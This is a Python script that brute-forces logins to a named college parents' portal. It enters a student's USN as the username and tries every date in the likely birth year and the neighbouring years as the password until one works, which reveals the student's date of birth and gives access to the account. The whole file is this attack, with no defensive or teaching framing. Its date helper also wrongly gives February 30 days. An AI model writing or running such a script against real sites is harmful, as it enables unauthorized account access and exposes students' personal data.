from fixedrobo import WebScraper
import time

class Scraper:
    @classmethod
    def findDob(cls,usn,verbose=False,publishProgres=None):
        br = WebScraper(parser="html.parser",history=True)
        br.open("http://parents.msrit.edu/index.php")
        yyyy = cls.predictYear(usn)
        date = str(yyyy)+'-01-01'
        if verbose:
            print("Bruteforcing for usn: "+usn)
        msg = ''
        i = 0
        while True:
            msg=cls.verbose(date,msg)
            if verbose:
                print(msg,end="\r")   
            if publishProgres!=None:
                publishProgres(cur=i,msg=msg)
            form = br.get_form()
            form['username'] = usn
            form['passwd'] = date
            br.submit_form(form)
            if("[]"==str(br.find_all("input",id="username"))):
                return date
            date = cls.getNextDate(date,yyyy)
            if not date:
                return None
            i+=1
            time.sleep(0.1)

    
    @classmethod
    def verbose(cls,date,msg):
        yyyy,_,dd = cls.splitDate(date)
        if (dd%7==0 and dd!=28) or dd==1:
            msg = "Trying week "+str(dd//7+1)+" in month "+date.split('-')[1]+" of year "+str(yyyy)+" |"
            return msg
        load = ['|','/','-','\\']
        cur = msg[-1]
        n = load[(load.index(cur)+1)%4]
        return msg[:-1]+n

    @classmethod
    def getNextDate(cls,date,year):
        yyyy,mm,dd = cls.splitDate(date)
        dt = cls.getTotalDays(mm)
        if dd!=dt:
            return cls.intToDate(dd+1,mm,yyyy)
        if mm!=12:
            return cls.intToDate(1,mm+1,yyyy)
        if yyyy == year:
            return cls.intToDate(1,1,year-1)
        if yyyy == (year-1):
            return cls.intToDate(1,1,year+1)
        return None
        

    
    @classmethod
    def getTotalDays(cls,month):
        if month<8:
            if month%2==0:
                return 30
            return 31
        if month%2==0:
            return 31
        return 30
    
    @classmethod
    def splitDate(cls,date):
        return list(map(int,date.split('-')))
    
    @classmethod
    def intToDate(cls,dd,mm,yyyy):
        if mm<10:
            mm = '0'+str(mm)
        if dd<10:
            dd = '0'+str(dd)
        return str(yyyy)+'-'+str(mm)+'-'+str(dd)
    
    @classmethod
    def predictYear(cls,usn):
        yr = int(usn[3:5])
        diff = yr-18
        return 2000+diff